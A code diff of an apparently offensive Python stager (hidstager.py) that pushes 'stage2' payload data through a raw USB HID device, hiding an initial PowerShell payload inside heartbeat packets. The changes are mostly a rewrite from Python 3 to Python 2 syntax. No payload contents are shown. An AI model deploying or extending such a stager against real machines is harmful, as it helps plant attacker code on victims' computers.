@@ -21,7 +21,7 @@
 
 import sys
 import struct
-import queue
+import Queue
 import getopt
 
 
@@ -41,7 +41,7 @@ def fragment_rcvd(qin, fragemnt_assembler, src=0, dst=0, data=""):
 	# if src == dst == 0, ignore (heartbeat)
 	if (src != 0 or dst !=0):
 		# check if stream already present
-		if stream_id in fragment_assembler:
+		if fragment_assembler.has_key(stream_id):
 			# check if closing fragment (snd length = 0)
 			if (len(data) == 0):
 				# end of stream - add to input queue
@@ -58,32 +58,13 @@ def fragment_rcvd(qin, fragemnt_assembler, src=0, dst=0, data=""):
 			data_arr = [src, dst, data]
 			fragment_assembler[stream_id] = data_arr
 
-'''
 def send_packet(f, src=1, dst=1, data="", rcv=0):
 	snd = len(data)
 	#print "Send size: " + str(snd)
 	packet = struct.pack('!BBBB60s', src, dst, snd, rcv, data)
 	#print packet.encode("hex")
 	f.write(packet)
-'''
-
-
-def send_packet(f, src=1, dst=1, data=b"", rcv=0):
-    # Ensure data is a bytes object
-    if isinstance(data, str):
-        data = data.encode('utf-8')
-
-    # Adjust the length of data to be exactly 60 bytes
-    if len(data) > 60:
-        data = data[:60]  # Truncate if longer than 60 bytes
-    elif len(data) < 60:
-        data += b'\x00' * (60 - len(data))  # Pad with null bytes if shorter than 60 bytes
-
-    snd = len(data)
-    packet = struct.pack('!BBBB60s', src, dst, snd, rcv, data)
-    f.write(packet)
-
-	
+		
 def read_packet(f):
 	hidin = f.read(0x40)
         #print "Input received (" + str(len(hidin)) + " bytes):"
@@ -99,8 +80,8 @@ def read_packet(f):
 	
 def deliverStage2(hidDevPath, stage2Data, oneshot):
 	# main code
-	qout = queue.Queue()
-	qin = queue.Queue()
+	qout = Queue.Queue()
+	qin = Queue.Queue()
 	fragment_assembler = {}
 
 	
@@ -132,12 +113,12 @@ def deliverStage2(hidDevPath, stage2Data, oneshot):
 				# by the PowerShell client, we use them to carry the initial payload
 				# in an endless loop
 				if heartbeat_counter == 0:
-					print("Start new stage2 delivery")
+					print "Start new stage2 delivery"
 				if heartbeat_counter == len(heartbeat_content):
 					heartbeat_counter = 0
 				send_packet(f=f, src=0, dst=0, data=heartbeat_content[heartbeat_counter], rcv=snd)
 				if heartbeat_counter == len(heartbeat_content)-1:
-					print("Ended stage2 delivery")
+					print "Ended stage2 delivery"
 					if oneshot:
 						# if oneshot is enabled, return after delivery
 						return
@@ -154,11 +135,11 @@ def main(argv):
 	try:
 		opts, args = getopt.getopt(argv,"shi:o:",["infile=","out="])
 	except getopt.GetoptError:
-		print('hidstager.py -i <inputfile> -o <outputfile> [-s]')
+		print 'hidstager.py -i <inputfile> -o <outputfile> [-s]'
 		sys.exit(2)
 	for opt, arg in opts:
 		if opt == '-h':
-			print('hidstager.py -i <inputfile> -o <outputfile> [-s]')
+			print 'hidstager.py -i <inputfile> -o <outputfile> [-s]'
 			sys.exit()
 		elif opt in ("-i", "--infile"):
 			inputfile = arg
@@ -168,12 +149,12 @@ def main(argv):
 			oneshot=True
 			
 	if len(inputfile) == 0 or len(outputfile) == 0:
-		print('Input (stage2 data) and output (raw HID device) have to be given!')
+		print 'Input (stage2 data) and output (raw HID device) have to be given!'
 		sys.exit(2)
 		
-	print('Delivering "', inputfile, '" via raw HID device "', outputfile, '"')
+	print 'Delivering "', inputfile, '" via raw HID device "', outputfile, '"'
 	if oneshot:
-		print('Exit after first delivery')
+		print 'Exit after first delivery'
    
 	# Initialize stage one payload, carried with heartbeat package in endless loop
 	#with open("wifi_agent.ps1","rb") as f:
